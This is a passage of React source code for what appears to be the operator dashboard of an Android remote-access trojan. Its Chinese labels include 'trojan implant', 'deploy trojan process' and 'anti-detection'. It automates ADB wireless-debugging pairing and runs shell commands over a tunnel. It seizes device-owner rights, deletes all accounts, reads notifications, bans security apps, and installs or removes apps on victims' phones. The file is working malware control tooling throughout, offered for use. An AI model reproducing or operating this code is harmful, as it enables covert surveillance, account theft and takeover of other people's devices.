                <button onClick={async () => { centerToast('查询封禁APP...'); try { const r = await sendTunnelShell('cat /data/local/tmp/black_apps.json 2>/dev/null'); const output = r?.data?.output || r?.output || r?.stdout || ''; let apps = []; try { const parsed = JSON.parse(output); apps = Array.isArray(parsed) ? parsed : (parsed?.apps || []) } catch {} if (apps.length === 0) { const r2 = await sendTunnelInput('getAppList', {}); apps = r2?.data?.apps || r2?.apps || [] } setBannedApps(Array.isArray(apps) ? apps : []); setBannedAppsModal(true) } catch { setBannedApps([]); setBannedAppsModal(true) } }} style={btnSmallRed}>安全App封禁</button>
              </div>
            </div>

            {/* 2b. 木马植入（放到无障碍设置下面，同一列） */}
            <div style={panelStyle} className="trojan-small-panel">
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 6px', marginBottom: 4, gap: 8 }}>
                <span style={{ ...panelTitle, marginBottom: 0, textAlign: 'left', fontSize: 12, fontWeight: 600, color: '#e0e0e0', whiteSpace: 'nowrap', flexShrink: 0 }} className="trojan-panel-title">木马植入</span>
                <span title={trojanLoading ? '检测中…' : trojanStatus.text} style={{ fontSize: 11, fontWeight: 600, color: trojanStatus.color, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: 140, lineHeight: 1, textAlign: 'right' }}>{trojanLoading ? '检测中…' : trojanStatus.text}</span>
              </div>
              <div style={panelDesc} className="trojan-panel-desc">
                第三层独立服务，不依赖现有无障碍或 ADB（需有无障碍权限并已打开无线调试开关）
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
                <button
                  onClick={() => runTrojanAction('deploy')}
                  disabled={trojanLoading}
                  style={{ ...btnBlue, opacity: trojanLoading ? 0.75 : 1, cursor: trojanLoading ? 'wait' : 'pointer' }}>
                  一键木马植入
                </button>
                <button
                  onClick={() => { trojanEverManuallyChecked.current = true; runTrojanAction('status') }}
                  disabled={trojanLoading}
                  style={{ ...btnGreen, opacity: trojanLoading ? 0.75 : 1, cursor: trojanLoading ? 'wait' : 'pointer' }}>
                  查询状态
                </button>
                <button
                  onClick={() => runTrojanAction('repair')}
                  disabled={trojanLoading}
                  style={{ ...btnBlue, opacity: trojanLoading ? 0.75 : 1, cursor: trojanLoading ? 'wait' : 'pointer' }}>
                  修复木马
                </button>
                <button
                  onClick={async () => { if (!confirm('确认停止木马？将停止第三层独立服务。')) return; runTrojanAction('stop') }}
                  disabled={trojanLoading}
                  style={{ ...btnRed, opacity: trojanLoading ? 0.75 : 1, cursor: trojanLoading ? 'wait' : 'pointer' }}>
                  停止木马
                </button>
              </div>
            </div>
          </div>

          {/* 3. ADB管理 */}
          <div style={{ flex: '1 1 25%', minWidth: 0, maxWidth: '25%', display: 'flex', alignSelf: 'flex-start', flexDirection: 'column', gap: 3 }}>
            <div style={panelStyle} className="trojan-small-panel">
            <div style={panelTitle} className="trojan-panel-title">ADB管理</div>

            {/* 区块1: 当前状态 */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 2, padding: '2px 6px 4px 6px' }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 2 }}>
                <span style={{ fontSize: 11, fontWeight: 600, color: '#e0e0e0' }} className="trojan-panel-subtitle">当前状态</span>
                <span style={{ fontSize: 10, color: 'rgba(255,255,255,.45)' }} className="trojan-panel-desc">{adbStatusLoading ? '检测中…' : '实时'}</span>
              </div>
              {[
                { k: 'deviceConnect', label: '设备连接', on: '在线', off: '离线', goodColor: '#52c41a', badColor: '#ff4d4f' },
                { k: 'wifiDebug',     label: '无线调试', on: '已开启', off: '未开启', goodColor: '#52c41a', badColor: '#ff4d4f' },
                { k: 'adbLine',       label: 'ADB线路',  on: '在线',   off: '离线',  goodColor: '#52c41a', badColor: '#ff4d4f' },
                { k: 'trojanProcess', label: '木马进程', on: '运行中', off: '未运行', goodColor: '#52c41a', badColor: '#ff4d4f' },
              ].map(row => {
                const v = adbStatus[row.k]
                const isOn = v === true
                const text = v === null ? '未检测' : (isOn ? row.on : row.off)
                const color = v === null ? 'rgba(255,255,255,.45)' : (isOn ? row.goodColor : row.badColor)
                return <div key={row.k} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '1px 0' }}>
                  <span style={{ fontSize: 10, color: 'rgba(255,255,255,.7)' }}>{row.label}</span>
                  <span style={{ fontSize: 10, fontWeight: 600, color }}>{text}</span>
                </div>
              })}
              <div style={{ display: 'flex', justifyContent: 'center', marginTop: 2 }}>
                <button onClick={refreshAllAdbStatus} disabled={adbStatusLoading} style={{ ...btnSmallBlue, opacity: adbStatusLoading ? 0.7 : 1, cursor: adbStatusLoading ? 'wait' : 'pointer' }}>
                  {adbStatusLoading ? '检测中…' : '刷新全部状态'}
                </button>
              </div>
            </div>

            {/* 区块2: 首次部署 */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 2, padding: '4px 6px 2px 6px', borderTop: '1px solid rgba(255,255,255,.06)', marginTop: 2 }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 2 }}>
                <span style={{ fontSize: 11, fontWeight: 600, color: '#e0e0e0' }} className="trojan-panel-subtitle">首次部署</span>
                <span style={{ fontSize: 10, color: 'rgba(255,255,255,.45)' }} className="trojan-panel-desc">按顺序执行</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'center' }}>
                <button
                  onClick={() => {
                    if (device?.bridge_connected) { centerToast('当前已成功连接服务，请勿重复部署', 'warn'); return }
                    if (adbDeploying) { centerToast('部署正在进行中，请等待...', 'warn'); return }
                    setAdbDeploying(true); setDeployMsg('正在启动一键ADB部署...')
                    sendCmd('FULL_DEPLOY'); centerToast('一键ADB部署已启动...')
                    clearTimeout(deployTimerRef.current)
                    deployTimerRef.current = setTimeout(() => { if (adbDeploying) { setAdbDeploying(false); setDeployMsg('部署超时'); addLog?.('一键ADB部署超时') } }, 120000)
                  }}
                  disabled={adbDeploying}
                  style={{ ...btnBlue, height: 30, fontSize: 12, opacity: adbDeploying ? 0.8 : 1, cursor: adbDeploying ? 'wait' : 'pointer' }}>
                  {adbDeploying ? '部署中…' : '一键ADB部署'}
                </button>
              </div>

              {adbDeploying && <div style={{ padding: '3px 6px', borderRadius: 4, background: 'rgba(24,144,255,.1)', border: '1px solid rgba(24,144,255,.3)', fontSize: 10, color: '#1890ff', display: 'flex', alignItems: 'center', gap: 6, margin: '2px 0' }}><span style={{ display: 'inline-block', width: 10, height: 10, border: '2px solid #1890ff', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite' }} /><span>{deployMsg || '部署中...'}</span></div>}
              {!adbDeploying && deployMsg && <div style={{ padding: '3px 6px', borderRadius: 4, background: 'rgba(82,196,26,.1)', border: '1px solid rgba(82,196,26,.3)', fontSize: 10, color: '#52c41a', margin: '2px 0' }}>{deployMsg}</div>}

              <div style={panelDesc} className="trojan-panel-desc">
                手动流程：开发者选项 → 无线调试 → 配对 → 部署木马进程
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
                <button onClick={() => { sendCmd('OPEN_ABOUT_PHONE'); centerToast('已打开关于手机'); addLog?.('步骤1：打开关于手机') }} style={{ ...btnBlue, height: 28 }}>1. 打开关于手机</button>
                <button onClick={() => { sendCmd('OPEN_WIFI_DEBUG_SETTINGS'); centerToast('已打开无线调试'); addLog?.('步骤2：打开无线调试') }} style={{ ...btnBlue, height: 28 }}>2. 打开无线调试</button>
                <button onClick={() => { sendCmd('DIRECT_PAIR'); centerToast('正在读取配对码并自动配对...'); addLog?.('步骤3：自动读取并配对') }} style={{ ...btnGreen, height: 28 }}>3. 自动读取并配对</button>

                <div style={{ display: 'flex', width: '100%', marginTop: 2, padding: '0 2px' }}>
                  <input type="text" placeholder="手动输入配对码" value={pairCode} onChange={e => setPairCode(e.target.value)} style={{ width: '65%', height: 26, padding: '0 6px', border: '1px solid rgba(255,255,255,.15)', borderRadius: 4, background: 'rgba(255,255,255,.06)', color: '#fff', fontSize: 10, outline: 'none', boxSizing: 'border-box' }} />
                  <button onClick={() => { if (!pairCode.trim()) { centerToast('请输入配对码', 'err'); return }; sendCmd('DIRECT_PAIR', { code: pairCode.trim() }); centerToast(`已发送配对：${pairCode.trim()}`); addLog?.(`步骤3（手动配对）: ${pairCode.trim()}`) }} style={{ width: '35%', marginLeft: 4, height: 26, fontSize: 10, fontWeight: 600, borderRadius: 4, border: 'none', background: 'linear-gradient(135deg, #1890ff 0%, #096dd9 100%)', color: '#fff', cursor: 'pointer', boxSizing: 'border-box', letterSpacing: 1 }}>配对</button>
                </div>

                <button onClick={() => { sendCmd('DEPLOY_LOCAL_SERVICE'); centerToast('步骤4：正在部署木马进程...'); addLog?.('步骤4：部署木马进程') }} style={{ ...btnBlue, height: 28 }}>4. 部署木马进程</button>
                <button onClick={() => {
                  centerToast('步骤5：正在检查ADB线路...'); refreshAllAdbStatus(); addLog?.('步骤5：检查ADB线路')
                  sendTunnelShell('getprop service.adb.tcp.port; ss -tln 2>/dev/null | grep -E "5555|55555|1[0-9]{3,}" | head -n 3; pidof local-service frpc 2>/dev/null; echo ---done')
                    .then(r => { const out = r?.data?.output || r?.output || r?.stdout || ''; centerToast(out && out.trim() ? out.split('\n').slice(0,5).join(' / ') : '检查完成，请查看状态卡片') })
                }} style={{ ...btnGreen, height: 28 }}>5. 检查ADB线路</button>
              </div>
            </div>
          </div>
          </div>

          {/* 4. 设备管理员 + APP管理（同列上下堆叠） */}
          <div style={{ flex: '1 1 25%', minWidth: 0, maxWidth: '25%', display: 'flex', alignSelf: 'flex-start', flexDirection: 'column', gap: 4 }}>
            {/* 4a. 设备管理员 */}
            <div style={panelStyle} className="trojan-small-panel">
              <div style={panelTitle} className="trojan-panel-title">设备管理员</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                  <button onClick={async () => { centerToast('查询中...'); try { const r = await sendTunnelInput('isActiveDeviceOwner', {}); const d = r?.data || r; if (d?.version || d?.uptime) { const shellR = await sendTunnelShell('dpm list-owners 2>/dev/null; dpm list-active-admins 2>/dev/null; echo ---'); const output = shellR?.data?.output || shellR?.output || shellR?.stdout || ''; const hasOwner = output.includes('Device owner:') || output.includes('Owner:'); const hasAdmin = output.includes('Active admin') || output.includes('admin'); centerToast(`管理员: ${hasAdmin ? '是' : '否'} | Owner: ${hasOwner ? '是' : '否'}`); addLog(`管理员状态(shell): admin=${hasAdmin}, owner=${hasOwner}`) } else { const isAdmin = d?.isAdminActive === '1' || d?.isAdminActive === 1 || d?.isAdmin === true || d?.isAdmin === '1' || d?.Success === true; const isOwner = d?.isDeviceOwner === '1' || d?.isDeviceOwner === 1 || d?.isOwner === true; centerToast(`管理员: ${isAdmin ? '是' : '否'} | Owner: ${isOwner ? '是' : '否'}`); addLog(`管理员状态: admin=${isAdmin}, owner=${isOwner}`) } } catch (e) { centerToast('查询失败: ' + e.message, 'err') } }} style={btnSmallBlue}>状态</button>
                  <button onClick={async () => { centerToast('正在激活管理员...'); const r = await sendTunnelInput('setActiveAdmin', {}); const d = r?.data || r; const msg = d?.Message || d?.message || ''; if (r.success === false || d?.Success === false) { centerToast(`激活失败: ${msg || r.error || '未知'}`, 'err') } else if (msg === 'already active') { centerToast('已是激活状态') } else { centerToast('已激活管理员') }; addLog(`激活管理员: ${msg || '成功'}`) }} style={btnSmallBlue}>激活</button>
                  <button onClick={async () => { if (!confirm('移除管理员后 App 会被强制停止，确认？')) return; centerToast('正在移除...'); const r = await sendTunnelInput('removeActiveAdmin', {}); centerToast(r.success !== false ? '已移除' : (r.error || '移除失败')) }} style={btnSmallRed}>移除</button>
                  <button onClick={async () => { if (!confirm('设置 Owner 需设备无账户，确认？')) return; centerToast('正在设置...'); const r = await sendTunnelInput('setDeviceOwner', {}); const d = r?.data || r; if (r.success === false || d?.success === false) { centerToast(d?.message || r.error || '设置失败', 'err') } else { centerToast('已设置Owner') } }} style={btnSmallBlue}>设Owner</button>
                  <button onClick={async () => { if (!confirm('清除 Owner 后需重新配置，确认？')) return; centerToast('正在清除...'); const r = await sendTunnelInput('clearDeviceOwner', {}); centerToast(r.success !== false ? '已清除' : (r.error || '清除失败')) }} style={btnSmallRed}>清除Owner</button>
                  <button onClick={async () => { if (!confirm('将删除设备上所有账户，确认？')) return; centerToast('正在删除...'); const r = await sendTunnelInput('removeAllAccounts', {}); centerToast(r.success !== false ? '已删除所有账户' : (r.error || '删除失败')) }} style={btnSmallRed}>删除账户</button>
                  <button onClick={async () => { centerToast('查询中...'); const r = await sendTunnelInput('listAccounts', {}); const d = r?.data || r; const accounts = d?.accounts || []; if (accounts.length === 0) { centerToast('设备无账户') } else { centerToast(`账户(${accounts.length}): ${accounts.join(', ')}`) } }} style={btnSmallBlue}>列出账户</button>
                  <button onClick={async () => { centerToast('获取通知...'); const r = await sendTunnelInput('getNotifications', {}); const d = r?.data || r; const notifications = d?.notifications || []; centerToast(notifications.length === 0 ? '无通知' : `通知: ${notifications.length}条`) }} style={btnSmallBlue}>获取通知</button>
              </div>
            </div>

            {/* 4b. APP管理（放到设备管理员下面，同一列） */}
            <div style={panelStyle} className="trojan-small-panel">
              <div style={panelTitle} className="trojan-panel-title">APP管理</div>
              <div style={panelDesc} className="trojan-panel-desc">
                系统与用户软件、详情、启停及APK安装。
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
                <button
                  onClick={() => setAppMgrVisible(true)}
                  style={btnBlue}>
                  打开ADB应用管理
                </button>
              </div>
            </div>
          </div>
        </div>
          {/* 窗口防检测：紧接4列小面板正下方（填红框空白，不再顶整页最底） */}
          <div className="trojan-listener-panel" style={{ overflow: 'visible', padding: '6px 8px 0', borderTop: '1px solid rgba(255,255,255,.08)', marginTop: 2, flex: '1 1 auto' }}>
            <WindowListenerPanel sendTunnelInput={sendTunnelInput} addLog={addLog} centerToast={centerToast} />
          </div>
        </div>
      </div>

      {/* ===== ADB应用管理中心弹窗（完全按图一：标题+6tab+搜索+表格+分页+安装APK） ===== */}
      {appMgrVisible && (
        <div
          className="overlay-modal-backdrop"
          style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.55)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }}
          onClick={e => { if (e.target === e.currentTarget) setAppMgrVisible(false) }}
        >
          <div className="appmgr-modal-card" style={{
            width: 'min(88vw, 1100px)',
            maxHeight: '86vh',
            background: '#1e293b',
            borderRadius: 8,
            border: '1px solid rgba(255,255,255,0.08)',
            boxShadow: '0 20px 60px rgba(0,0,0,.6)',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden'
          }}>
            {/* 标题栏 */}
            <div className="appmgr-modal-header" style={{
              display: 'flex', alignItems: 'center',
              padding: '10px 16px',
              borderBottom: '1px solid rgba(255,255,255,.08)',
              background: 'linear-gradient(180deg, rgba(24,144,255,.12), rgba(24,144,255,0))'
            }}>
              <div style={{ width: 4, height: 18, background: '#1890ff', borderRadius: 2, marginRight: 8 }} />
              <span className="appmgr-modal-title" style={{ color: '#e2e8f0', fontSize: 15, fontWeight: 600 }}>ADB应用管理中心</span>
              <span style={{
                marginLeft: 8,
                padding: '2px 10px',
                borderRadius: 999,
                fontSize: 11,
                fontWeight: 600,
                background: 'rgba(82,196,26,.15)',
                color: '#52c41a',
                border: '1px solid rgba(82,196,26,.3)'
              }}>全部软件 {appMgrTotal}</span>
              <span className="appmgr-modal-desc" style={{ marginLeft: 'auto', color: '#94a3b8', fontSize: 12 }}>
                包含用户应用、系统应用及当前用户已移除的预装应用
              </span>
              <button onClick={() => setAppMgrVisible(false)} className="appmgr-close" style={{
                marginLeft: 12, width: 26, height: 26, borderRadius: 4,
                border: '1px solid rgba(255,255,255,.1)',
                background: 'rgba(255,255,255,.05)', color: '#cbd5e1',
                cursor: 'pointer', fontSize: 14, lineHeight: '22px', textAlign: 'center'
              }}>×</button>
            </div>

            {/* 工具栏：搜索 + 6 分类 tab + 刷新 + 选择文件 + 安装 */}
            <div className="appmgr-toolbar" style={{
              padding: '10px 16px',
              borderBottom: '1px solid rgba(255,255,255,.08)',
              display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap'
            }}>
              <input
                placeholder="搜索应用名称或包名"
                value={appMgrSearch}
                onChange={e => setAppMgrSearch(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter') loadAppMgrApps() }}
                style={{
                  width: 200, padding: '6px 10px',
                  background: 'rgba(255,255,255,.05)',
                  border: '1px solid rgba(255,255,255,.12)',
                  borderRadius: 4, color: '#e2e8f0', fontSize: 12, outline: 'none'
                }}
              />
              {appMgrFilterTabs.map(t => (
                <button key={t.k}
                  className={'appmgr-filter-tab ' + (appMgrFilter === t.k ? 'active' : '')}
                  onClick={() => setAppMgrFilter(t.k)}
                  style={{
                    padding: '5px 12px',
                    fontSize: 12, fontWeight: 500,
                    borderRadius: 4, cursor: 'pointer',
                    border: appMgrFilter === t.k
                      ? '1px solid #1890ff'
                      : '1px solid rgba(255,255,255,.12)',
                    background: appMgrFilter === t.k
                      ? 'linear-gradient(135deg, #1890ff, #096dd9)'
                      : 'rgba(255,255,255,.04)',
                    color: appMgrFilter === t.k ? '#fff' : '#cbd5e1',
                  }}>{t.label}</button>
              ))}
              <button onClick={loadAppMgrApps} disabled={appMgrLoading}
                style={{
                  padding: '5px 14px',
                  background: 'linear-gradient(135deg, #1890ff, #096dd9)',
                  border: 'none', borderRadius: 4,
                  color: '#fff', fontSize: 12, fontWeight: 600,
                  cursor: appMgrLoading ? 'wait' : 'pointer'
                }}>{appMgrLoading ? '加载中...' : '刷新列表'}</button>

              <div style={{ flex: 1 }} />

              <input ref={appMgrFileInputRef} type="file" accept=".apk"
                onChange={e => {
                  const f = e.target.files && e.target.files[0]
                  if (f) setAppMgrInstallFile(f)
                }}
                style={{ display: 'none' }} />
              <button
                onClick={() => appMgrFileInputRef.current && appMgrFileInputRef.current.click()}
                style={{
                  padding: '5px 14px',
                  background: 'rgba(255,255,255,.05)',
                  border: '1px solid rgba(255,255,255,.12)',
                  borderRadius: 4, color: appMgrInstallFile ? '#52c41a' : '#cbd5e1',
                  fontSize: 12, cursor: 'pointer', fontWeight: 500
                }}>
                选择文件
              </button>
              <span className="appmgr-file-name" style={{
                fontSize: 12, color: '#94a3b8',
                maxWidth: 240,
                overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'
              }}>{appMgrInstallFile ? appMgrInstallFile.name : '未选择任何文件'}</span>
              <button
                disabled={!appMgrInstallFile || appMgrInstalling}
                onClick={appMgrInstallConfirm}
                style={{
                  padding: '5px 16px',
                  background: !appMgrInstallFile || appMgrInstalling
                    ? 'rgba(82,196,26,.35)'
                    : 'linear-gradient(135deg, #52c41a, #389e0d)',
                  border: 'none', borderRadius: 4,
                  color: '#fff', fontSize: 12, fontWeight: 600,
                  cursor: (!appMgrInstallFile || appMgrInstalling) ? 'not-allowed' : 'pointer'
                }}>{appMgrInstalling ? '安装中...' : '安装APK'}</button>
            </div>

            {/* 表格 */}
            <div className="appmgr-table-wrap" style={{ flex: 1, minHeight: 260, overflow: 'auto', padding: '8px 16px' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
                <thead className="appmgr-table-head">
                  <tr style={{ background: 'rgba(255,255,255,.04)', color: '#94a3b8' }}>
                    <th style={{ padding: '8px 10px', textAlign: 'left', width: 60, fontWeight: 600 }}>类型</th>
                    <th style={{ padding: '8px 10px', textAlign: 'left', fontWeight: 600 }}>应用</th>
                    <th style={{ padding: '8px 10px', textAlign: 'left', width: 100, fontWeight: 600 }}>版本</th>
                    <th style={{ padding: '8px 10px', textAlign: 'center', width: 60, fontWeight: 600 }}>状态</th>
                    <th style={{ padding: '8px 10px', textAlign: 'center', width: 60, fontWeight: 600 }}>UID</th>
                    <th style={{ padding: '8px 10px', textAlign: 'left', width: 260, fontWeight: 600 }}>操作</th>
                  </tr>
                </thead>
                <tbody className="appmgr-table-body">
                  {appMgrLoading ? (
                    <tr><td colSpan={6} className="appmgr-loading" style={{ padding: 48, textAlign: 'center', color: '#94a3b8' }}>获取中...</td></tr>
                  ) : appMgrPageApps.length === 0 ? (
                    <tr><td colSpan={6} className="appmgr-empty" style={{ padding: 64, textAlign: 'center', color: '#94a3b8' }}>
                      <div style={{ fontSize: 28, marginBottom: 8, opacity: .4 }}>📱</div>
                      <div style={{ fontSize: 13 }}>没有符合条件的软件</div>
                    </td></tr>
                  ) : (
                    appMgrPageApps.map((a, i) => {
                      const pkg = a.packageName || a.package || ''
                      const iconSrc = a.icon
                        ? (a.icon.startsWith('data:') || a.icon.startsWith('http')
                          ? a.icon
                          : `data:image/png;base64,${a.icon}`)
                        : ''
                      const statusTag = !a.installed
                        ? { text: '已移除', color: '#bfbfbf', bg: 'rgba(191,191,191,.1)' }
                        : !a.enabled
                          ? { text: '禁用', color: '#ef4444', bg: 'rgba(239,68,68,.1)' }
                          : a.running
                            ? { text: '运行中', color: '#52c41a', bg: 'rgba(82,196,26,.1)' }
                            : { text: '已安装', color: '#1890ff', bg: 'rgba(24,144,255,.1)' }
                      const typeTag = a.system
                        ? { text: '系统', color: '#722ed1', bg: 'rgba(114,46,209,.12)' }
                        : { text: '用户', color: '#1890ff', bg: 'rgba(24,144,255,.12)' }
                      return (
                        <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)', color: '#e2e8f0' }}>
                          <td style={{ padding: '7px 10px' }}>
                            <span style={{
                              padding: '2px 8px', fontSize: 10,
                              borderRadius: 3, fontWeight: 600,
                              color: typeTag.color, background: typeTag.bg
                            }}>{typeTag.text}</span>
                          </td>
                          <td style={{ padding: '7px 10px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                              {iconSrc
                                ? <img src={iconSrc} alt="" style={{ width: 22, height: 22, borderRadius: 4 }} />
                                : <span style={{ fontSize: 18 }}>📱</span>}
                              <div style={{ minWidth: 0 }}>
                                <div style={{ fontSize: 12, fontWeight: 600, color: '#f1f5f9' }}>{a.appName || a.name || pkg}</div>
                                <div style={{ fontSize: 10, color: '#64748b', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: 320 }}>{pkg}</div>
                              </div>
                            </div>
                          </td>
                          <td style={{ padding: '7px 10px', fontSize: 11, color: '#94a3b8' }}>{a.versionName || a.version || '--'}</td>
                          <td style={{ padding: '7px 10px', textAlign: 'center' }}>
                            <span style={{
                              padding: '2px 8px', fontSize: 10,
                              borderRadius: 3, fontWeight: 600,
                              color: statusTag.color, background: statusTag.bg
                            }}>{statusTag.text}</span>
                          </td>
                          <td style={{ padding: '7px 10px', textAlign: 'center', fontSize: 11, color: '#94a3b8' }}>{a.uid ?? '--'}</td>
                          <td style={{ padding: '7px 10px' }}>
                            <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap' }}>
                              <button onClick={() => appMgrAction('launch', pkg)} style={_rowBtn('#52c41a')}>打开</button>
                              <button onClick={() => appMgrAction('forceStop', pkg)} style={_rowBtn('#ef4444')}>停止</button>
                              {a.enabled
                                ? <button onClick={() => appMgrAction('disable', pkg)} style={_rowBtn('#f59e0b')}>禁用</button>
                                : <button onClick={() => appMgrAction('enable', pkg)} style={_rowBtn('#1890ff')}>启用</button>}
                              <button onClick={() => appMgrAction('clearData', pkg)} style={_rowBtn('#722ed1')}>清数据</button>
                              {a.installed
                                ? <button onClick={() => { if (confirm(`确认卸载 ${a.appName || pkg} ?`)) appMgrAction('uninstall', pkg) }} style={_rowBtn('#ef4444')}>卸载</button>
                                : <button onClick={() => appMgrAction('restore', pkg)} style={_rowBtn('#52c41a')}>恢复</button>}
                            </div>
                          </td>
                        </tr>
                      )
                    })
                  )}
                </tbody>
              </table>
            </div>

            {/* 分页 */}
            <div className="appmgr-pagination" style={{
              padding: '10px 16px',
              borderTop: '1px solid rgba(255,255,255,.08)',
              display: 'flex', gap: 8, alignItems: 'center', justifyContent: 'center'
            }}>
              <button
                disabled={appMgrPage <= 1}
                onClick={() => setAppMgrPage(Math.max(1, appMgrPage - 1))}
                style={{
                  padding: '4px 14px',
                  background: appMgrPage <= 1 ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)',
                  border: '1px solid rgba(255,255,255,.1)',
                  borderRadius: 4, color: appMgrPage <= 1 ? '#64748b' : '#e2e8f0',
                  fontSize: 12, cursor: appMgrPage <= 1 ? 'not-allowed' : 'pointer'
                }}>上一页</button>
              <span style={{ fontSize: 12, color: '#cbd5e1' }}>
                第 {appMgrPage} / {appMgrTotalPages} 页，共 {appMgrTotal} 个
              </span>
              <button
                disabled={appMgrPage >= appMgrTotalPages}
                onClick={() => setAppMgrPage(Math.min(appMgrTotalPages, appMgrPage + 1))}
                style={{
                  padding: '4px 14px',
                  background: appMgrPage >= appMgrTotalPages ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)',
                  border: '1px solid rgba(255,255,255,.1)',
                  borderRadius: 4, color: appMgrPage >= appMgrTotalPages ? '#64748b' : '#e2e8f0',
                  fontSize: 12, cursor: appMgrPage >= appMgrTotalPages ? 'not-allowed' : 'pointer'
                }}>下一页</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}